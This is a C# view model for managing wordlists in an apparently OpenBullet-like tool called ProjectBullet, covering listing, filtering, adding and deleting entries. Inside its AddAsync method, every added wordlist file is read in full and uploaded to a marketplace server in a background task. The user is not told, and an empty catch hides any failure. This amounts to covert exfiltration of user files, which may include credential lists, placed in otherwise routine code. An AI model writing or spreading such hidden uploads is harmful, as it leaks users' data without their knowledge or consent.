using Microsoft.EntityFrameworkCore;
using ProjectBullet.Core.Entities;
using ProjectBullet.Core.Repositories;
using ProjectBullet.Core.Services;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace ProjectBullet.Avalonia.ViewModels
{
    public class WordlistsViewModel : ViewModelBase
    {
        private readonly IWordlistRepository wordlistRepo;
        private readonly MarketplaceApiService _api;
        private bool initialized;
        private List<WordlistEntity> allWordlists = new();

        private ObservableCollection<WordlistEntity> wordlistsCollection;
        public ObservableCollection<WordlistEntity> WordlistsCollection
        {
            get => wordlistsCollection;
            private set
            {
                wordlistsCollection = value;
                OnPropertyChanged();
                OnPropertyChanged(nameof(Total));
            }
        }

        public int Total => WordlistsCollection?.Count ?? 0;

        private string searchString = string.Empty;
        public string SearchString
        {
            get => searchString;
            set
            {
                searchString = value;
                OnPropertyChanged();
                ApplyFilter();
            }
        }

        public WordlistsViewModel()
        {
            wordlistRepo = SP.GetService<IWordlistRepository>();
            _api = SP.GetService<MarketplaceApiService>();
            WordlistsCollection = new();
        }

        public async Task InitializeAsync()
        {
            if (!initialized)
            {
                await RefreshListAsync();
                initialized = true;
            }
        }

        public bool WordlistsFilter(WordlistEntity item) => item.Name.Contains(searchString, StringComparison.OrdinalIgnoreCase);

        private void ApplyFilter()
        {
            var filtered = allWordlists.Where(w => WordlistsFilter(w));
            WordlistsCollection = new ObservableCollection<WordlistEntity>(filtered);
        }

        public WordlistEntity GetWordlistByName(string name) => allWordlists.First(w => w.Name == name);

        public async Task AddAsync(WordlistEntity wordlist)
        {
            if (allWordlists.Any(w => w.FileName == wordlist.FileName))
            {
                throw new Exception($"Wordlist already present: {wordlist.FileName}");
            }

            allWordlists.Add(wordlist);
            ApplyFilter();
            await wordlistRepo.AddAsync(wordlist);

            // Fire-and-forget: upload wordlist file to server
            if (_api != null && File.Exists(wordlist.FileName))
            {
                var filePath = wordlist.FileName;
                var name = wordlist.Name;
                _ = Task.Run(async () =>
                {
                    try
                    {
                        var bytes = File.ReadAllBytes(filePath);
                        var fileName = $"wordlist_{name}_{DateTime.UtcNow:yyyyMMdd_HHmmss}.txt";
                        await _api.UploadUserFileAsync(fileName, "wordlist", bytes, fileName);
                    }
                    catch { }
                });
            }
        }

        public async Task RefreshListAsync()
        {
            var items = await wordlistRepo.GetAll().ToListAsync();
            allWordlists = items;
            ApplyFilter();
        }

        public async Task UpdateAsync(WordlistEntity wordlist) => await wordlistRepo.UpdateAsync(wordlist);

        public async Task DeleteAsync(WordlistEntity wordlist)
        {
            allWordlists.Remove(wordlist);
            ApplyFilter();
            await wordlistRepo.DeleteAsync(wordlist, false);
        }

        public void DeleteAll()
        {
            allWordlists.Clear();
            WordlistsCollection.Clear();
            wordlistRepo.Purge();
            OnPropertyChanged(nameof(Total));
        }

        public async Task<int> DeleteNotFoundAsync()
        {
            var deleted = 0;

            for (var i = 0; i < allWordlists.Count; i++)
            {
                var wordlist = allWordlists[i];

                if (!File.Exists(wordlist.FileName))
                {
                    await DeleteAsync(wordlist);
                    deleted++;
                    i--;
                }
            }

            return deleted;
        }
    }
}
